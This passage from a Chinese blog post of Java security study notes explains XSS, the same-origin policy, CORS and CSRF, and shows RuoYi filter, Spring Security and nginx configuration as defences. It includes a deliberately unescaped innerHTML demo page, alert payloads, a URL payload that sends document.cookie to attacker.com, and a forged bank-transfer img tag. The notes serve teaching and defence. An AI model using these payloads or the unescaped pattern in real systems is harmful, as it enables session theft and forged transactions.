&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Unsecured Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to our website!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 用户输入的文本框 --&gt;</span><br><span class="line">    &lt;label for=&quot;userInput&quot;&gt;Enter your input:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;userInput&quot;&gt;</span><br><span class="line">    &lt;button onclick=&quot;displayUserInput()&quot;&gt;Display Input&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 用户输入直接显示在页面上的区域，没有进行防御 --&gt;</span><br><span class="line">    &lt;div id=&quot;user-content&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function displayUserInput() &#123;</span><br><span class="line">            // 获取用户输入</span><br><span class="line">            var userInput = document.getElementById(&#x27;userInput&#x27;).value;</span><br><span class="line"></span><br><span class="line">            // 直接将用户输入插入到页面上，没有经过转义</span><br><span class="line">            var userContentDiv = document.getElementById(&#x27;user-content&#x27;);</span><br><span class="line">            userContentDiv.innerHTML = userInput;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个页面中，如果在输入框中输入：<code>&lt;img src=&quot;http://888.888.com/999.png&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code>，点击按钮会发现会弹出”XSS”，这便说明该页面存在XSS漏洞。（这里说一下，如果是输入<code>&lt;script&gt;alert(&#39;XSS Attack&#39;);&lt;/script&gt;</code>，将看不到效果，似乎是浏览器会将&lt;s及其之后的内容识别并进行阻止）</p><p>为了避免被攻击，网站应该对用户的输入内容进行转义处理，例如上面的script修改成下面这样的即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function displayUserInput() &#123;</span><br><span class="line">        // 获取用户输入</span><br><span class="line">        var userInput = document.getElementById(&#x27;userInput&#x27;).value;</span><br><span class="line"></span><br><span class="line">        // 对用户输入进行转义</span><br><span class="line">        var div = document.createElement(&#x27;div&#x27;);</span><br><span class="line">        div.appendChild(document.createTextNode(userInput));</span><br><span class="line">        </span><br><span class="line">        // 清空原有内容</span><br><span class="line">        var userContentDiv = document.getElementById(&#x27;user-content&#x27;);</span><br><span class="line">        userContentDiv.innerHTML = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">        // 将处理后的输入显示在页面上</span><br><span class="line">        userContentDiv.appendChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面的示例是发生在客户端中，并且输入的地方是在输入框。在实际攻击的时候很多进行注入的地方不在输入框，而是在url中。那么此时的攻击流程就是这样的：</p><p>攻击者构造一个包含恶意脚本的连接，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.html?input=&lt;script&gt;</span><br><span class="line">  // 恶意脚本，将用户的 Cookie 发送到攻击者的服务器</span><br><span class="line">  var img = new Image();</span><br><span class="line">  img.src = &quot;http://attacker.com/steal.php?cookie=&quot; + document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在这个例子中，攻击者在用户浏览器中注入了一个 <code>&lt;script&gt;</code> 标签，其中的 JavaScript 代码创建了一个图片对象，并将用户的 Cookie 信息附加到一个 URL 中，然后通过 Image 对象的 <code>src</code> 属性来请求这个 URL。这样，当用户点击链接时，恶意脚本将用户的 Cookie 发送到了攻击者控制的服务器上。</p><p>攻击不止会发生在客户端，还会发生在服务端，将脚本保存到数据库中，例如现在有一个网站有留言板或者评论功能，用户可以输入内容然后上传到留言板中，此时有人在留言板中输入<code>&lt;script&gt;alert(“hey!you are attacked”)&lt;/script&gt;</code> 然后上传到服务器中，如果服务器中没有做好XSS攻击防御，那么此时服务器的数据库存储下了这个内容，在其他用户访问的时候展示出来这个内容，展示到浏览器上网页代码就会变形如以下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">       &lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=”board” </span><br><span class="line">        &lt;script&gt;alert(“hey!you are attacked”)&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;     </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>那么访问的用户就会指定这一段恶意脚本。</p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>避免XSS的方法之一主要是将用户所提供的内容进行过滤，许多语言都有提供对HTML的过滤</p><p>在后端一般通过Filter实现防止XSS攻击的过滤器。</p><p>这里贴上一个过滤器的实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 防止XSS攻击的过滤器</span><br><span class="line"> *</span><br><span class="line"> * @author ruoyi</span><br><span class="line"> */</span><br><span class="line">public class XssFilter implements Filter &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 排除链接</span><br><span class="line">     */</span><br><span class="line">    public List&lt;String&gt; excludes = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        String tempExcludes = filterConfig.getInitParameter(&quot;excludes&quot;);</span><br><span class="line">        if (StringUtils.isNotEmpty(tempExcludes)) &#123;</span><br><span class="line">            String[] url = tempExcludes.split(StringUtils.SEPARATOR);</span><br><span class="line">            for (int i = 0; url != null &amp;&amp; i &lt; url.length; i++) &#123;</span><br><span class="line">                excludes.add(url[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">        throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">        HttpServletResponse resp = (HttpServletResponse) response;</span><br><span class="line">        if (handleExcludeURL(req, resp)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request);</span><br><span class="line">        chain.doFilter(xssRequest, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String url = request.getServletPath();</span><br><span class="line">        String method = request.getMethod();</span><br><span class="line">        // GET DELETE 不过滤</span><br><span class="line">        if (method == null || HttpMethod.GET.matches(method) || HttpMethod.DELETE.matches(method)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return StringUtils.matches(url, excludes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * XSS过滤处理</span><br><span class="line"> *</span><br><span class="line"> * @author ruoyi</span><br><span class="line"> */</span><br><span class="line">public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @param request</span><br><span class="line">     */</span><br><span class="line">    public XssHttpServletRequestWrapper(HttpServletRequest request) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String[] getParameterValues(String name) &#123;</span><br><span class="line">        String[] values = super.getParameterValues(name);</span><br><span class="line">        if (values != null) &#123;</span><br><span class="line">            int length = values.length;</span><br><span class="line">            String[] escapseValues = new String[length];</span><br><span class="line">            for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">                // 防xss攻击和过滤前后空格</span><br><span class="line">                escapseValues[i] = HtmlUtil.cleanHtmlTag(values[i]).trim();</span><br><span class="line">            &#125;</span><br><span class="line">            return escapseValues;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.getParameterValues(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ServletInputStream getInputStream() throws IOException &#123;</span><br><span class="line">        // 非json类型，直接返回</span><br><span class="line">        if (!isJsonRequest()) &#123;</span><br><span class="line">            return super.getInputStream();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 为空，直接返回</span><br><span class="line">        String json = StrUtil.str(IoUtil.readBytes(super.getInputStream(), false), StandardCharsets.UTF_8);</span><br><span class="line">        if (StringUtils.isEmpty(json)) &#123;</span><br><span class="line">            return super.getInputStream();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // xss过滤</span><br><span class="line">        json = HtmlUtil.cleanHtmlTag(json).trim();</span><br><span class="line">        byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">        final ByteArrayInputStream bis = IoUtil.toStream(jsonBytes);</span><br><span class="line">        return new ServletInputStream() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public boolean isFinished() &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public boolean isReady() &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public int available() throws IOException &#123;</span><br><span class="line">                return jsonBytes.length;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void setReadListener(ReadListener readListener) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public int read() throws IOException &#123;</span><br><span class="line">                return bis.read();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 是否是Json请求</span><br><span class="line">     */</span><br><span class="line">    public boolean isJsonRequest() &#123;</span><br><span class="line">        String header = super.getHeader(HttpHeaders.CONTENT_TYPE);</span><br><span class="line">        return StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码中有排除链接等配置，需要在application.yml中进行设置，设置内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 防止XSS攻击</span><br><span class="line">xss:</span><br><span class="line">  # 过滤开关</span><br><span class="line">  enabled: true</span><br><span class="line">  # 排除链接（多个用逗号分隔）</span><br><span class="line">  excludes: /system/notice</span><br><span class="line">  # 匹配链接</span><br><span class="line">  urlPatterns: /system/*,/monitor/*,/tool/*</span><br></pre></td></tr></table></figure><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>上面介绍了XSS攻击，下面会记录CSRF攻击，在写CSRF攻击前，需要了解以下浏览器的同源策略。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>同源策略（英语：Same-origin policy）是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p><p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于HTTP cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p><p>值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷。</p><h2 id="同源策略示例"><a href="#同源策略示例" class="headerlink" title="同源策略示例"></a>同源策略示例</h2><p>下表列出哪些URL与URL <code>http://www.example.com/dir/page.html</code> 属于相同来源：</p><table><thead><tr><th>URL</th><th>结果</th><th>原因</th></tr></thead><tbody><tr><td><a href="http://www.example.com/dir/page2.html">http://www.example.com/dir/page2.html</a></td><td>是</td><td>只有路径不同</td></tr><tr><td><a href="http://www.example.com/dir2/other.html">http://www.example.com/dir2/other.html</a></td><td>是</td><td>只有路径不同</td></tr><tr><td><a href="http://username:password@www.example.com/dir2/other.html">http://username:password@www.example.com/dir2/other.html</a></td><td>是</td><td>只有路径不同</td></tr><tr><td><a href="http://www.example.com:81/dir/other.html">http://www.example.com:81/dir/other.html</a></td><td>否</td><td>不同端口（若未标明，http:&#x2F;&#x2F; 默认端口号为80）</td></tr><tr><td><a href="https://www.example.com/dir/other.html[%E5%A4%B1%E6%95%88%E9%93%BE%E6%8E%A5]">https://www.example.com/dir/other.html[失效链接]</a></td><td>否</td><td>不同协议（https和http）</td></tr><tr><td><a href="http://en.example.com/dir/other.html">http://en.example.com/dir/other.html</a></td><td>否</td><td>不同域名</td></tr><tr><td><a href="http://example.com/dir/other.html">http://example.com/dir/other.html</a></td><td>否</td><td>不同域名（需要完全匹配）</td></tr><tr><td><a href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td><td>否</td><td>不同域名（需要完全匹配）</td></tr></tbody></table><h2 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h2><p>最初学习web，在写前后端分离项目的时候遇到了CORS问题，这个问题就和同源策略有关。<br>在前后端分离的情况下，通常前端代码运行在一个独立的域（例如，<a href="http://localhost:3000/">http://localhost:3000</a> ），而后端 API 服务可能运行在另一个域（例如，<a href="http://localhost:8000/">http://localhost:8000</a> ）。由于这两者的域不同，就涉及到跨域请求。</p><p>解决跨域问题的方法这里记录两个：<br>1、CORS（跨域资源共享）： 在后端服务中设置适当的 CORS 头部，允许特定域的请求访问资源。通过配置响应头，后端可以明确指定哪些域是允许的，哪些方法和头部是允许的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">httpSecurity</span><br><span class="line">                // CSRF禁用,因为不使用session</span><br><span class="line">                .csrf().disable()</span><br><span class="line">                // 认证失败处理类</span><br><span class="line">                .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and()</span><br><span class="line">                // 基于token,所以不需要session</span><br><span class="line">                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and()</span><br><span class="line">                // 过滤请求</span><br><span class="line">                .authorizeRequests()</span><br><span class="line">                // 对于登录login 注册register 验证码captchaImage 允许匿名访问</span><br><span class="line">                .antMatchers(&quot;/login&quot;, &quot;/register&quot;, &quot;/captchaImage&quot;).anonymous()</span><br><span class="line">                // 静态资源,可匿名访问</span><br><span class="line">                .antMatchers(HttpMethod.GET, &quot;/&quot;, &quot;/*.html&quot;, &quot;/**/*.html&quot;, &quot;/**/*.css&quot;, &quot;/**/*.js&quot;, &quot;/profile/**&quot;)</span><br><span class="line">                .permitAll()</span><br><span class="line">                .antMatchers(&quot;/webjars/**&quot;, &quot;/*/api-docs&quot;, &quot;/druid/**&quot;)</span><br><span class="line">                .permitAll()</span><br><span class="line">                // 除上面外的所有请求全部需要鉴权认证</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">                .and()</span><br><span class="line">                .headers().frameOptions().disable();</span><br><span class="line">        // 添加Logout filter</span><br><span class="line">        httpSecurity.logout().logoutUrl(&quot;/logout&quot;).logoutSuccessHandler(logoutSuccessHandler);</span><br><span class="line">        // 添加JWT filter</span><br><span class="line">        httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class);</span><br><span class="line">        // 添加CORS filter</span><br><span class="line">        httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class);</span><br><span class="line">        httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class);</span><br></pre></td></tr></table></figure><p>2、代理服务器： 前端通过向同一域的代理服务器发起请求，再由代理服务器转发请求到后端。这样，由于同源策略仅在浏览器中执行，代理服务器和后端之间的通信不受同源策略的限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8082;</span><br><span class="line">        server_name localhost 192.168.50.124;</span><br><span class="line">        location /&#123;</span><br><span class="line">                #请填写具体域名  解决服务端返回401等错误时浏览器报跨域错误。nginx 转发 server 响应的过程中，add_header 只有在 200,201,204,206,301,302,303,304,307 状态码时会添加，而 401、500，都没有添加。解决：在 add_header 最后加上 always，可以让 nginx 在非默认状态码下 add_header 也可以生效。</span><br><span class="line"></span><br><span class="line">                add_header &quot;Access-Control-Allow-Origin&quot;  &quot;http://192.168.50.124&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Methods&quot; &quot;GET, POST, PUT, OPTIONS, HEAD&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Headers&quot; &quot;Origin,X-Requested-With,Content-Type,Cache-Control,Accept,Authorization,BBS-XSRF-TOKEN,Set-Cookie&quot; always;</span><br><span class="line">                #预检命令的缓存，如果不缓存每次会发送两次请求</span><br><span class="line">                add_header Access-Control-Max-Age 3600 always;</span><br><span class="line"></span><br><span class="line">                if ($request_method = &#x27;OPTIONS&#x27;) &#123;</span><br><span class="line">                        return 204;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                client_max_body_size 100M; #允许上传文件大小,默认是1M</span><br><span class="line"></span><br><span class="line">                proxy_set_header Host $host;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">                proxy_pass $scheme://192.168.50.124:8081;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>跨站请求伪造（英语：Cross-site request forgery），也被称为one-click attack或者session riding，通常缩写为CSRF或者XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p><h2 id="攻击示例："><a href="#攻击示例：" class="headerlink" title="攻击示例："></a>攻击示例：</h2><p>假如一家银行用以执行转账操作的URL地址如下： <code>https://bank.example.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code></p><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码： <code>&lt;img src=&quot;https://bank.example.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot; /&gt;</code></p><p>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义执行操作。</p><h2 id="csrf漏洞检测"><a href="#csrf漏洞检测" class="headerlink" title="csrf漏洞检测"></a>csrf漏洞检测</h2><p> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。<br>       <br>随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。<br>       <br>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h2 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h3><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p><h3 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h3><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p><p>SpringSecurity中就可以配置是否开启CSRF的token</p><h3 id="在RuoYi项目中的防御措施——关闭cookie认证并启用JWT"><a href="#在RuoYi项目中的防御措施——关闭cookie认证并启用JWT" class="headerlink" title="在RuoYi项目中的防御措施——关闭cookie认证并启用JWT"></a>在RuoYi项目中的防御措施——关闭cookie认证并启用JWT</h3><p>csrf的风险源在于cookie认证，因为浏览器在发送请求时会自动将cookie附带上去。</p><p>而在服务端关闭cookie作为鉴权方式，开启jwt鉴权则可以有效避免这一点，其原理其实也还是上面的——添加校验token。</p><p>jwt在笔记《写一个登录系统需要注意的地方》中有介绍过，其流程在这简单复述一遍，即用户登录系统后，服务器端根据用户信息按照一定加密方式生成一个JWT Token，服务器端并不保存该token，直接发送到客户端中，客户端收到后浏览器将该token存储在cookie或者LocalStorage中，在客户端发送请求的时候，前端代码手动将JWT Token附加到请求的头部或其他位置，发送到服务端。</p><p>此时遇到csrf攻击，cookie自动传输过去了也不会发生作用，因为后端不依赖cookie鉴权，而是依赖手动添加的token鉴权，单纯的csrf攻击是没法获取到cookie中的信息的，他只是发送请求，浏览器自动将cookie带去客户端。所以该方法可以有效避免csrf攻击。</p><p>但还是要注意，如果是xss攻击是可以获取到cookie的，也就是说当网站存在xss漏洞时，上面的防御都是空谈。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>写一个登录系统需要注意的地方</title>
    <link href="/2023/12/19/%E5%86%99%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9/"/>
    <url>/2023/12/19/%E5%86%99%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
    
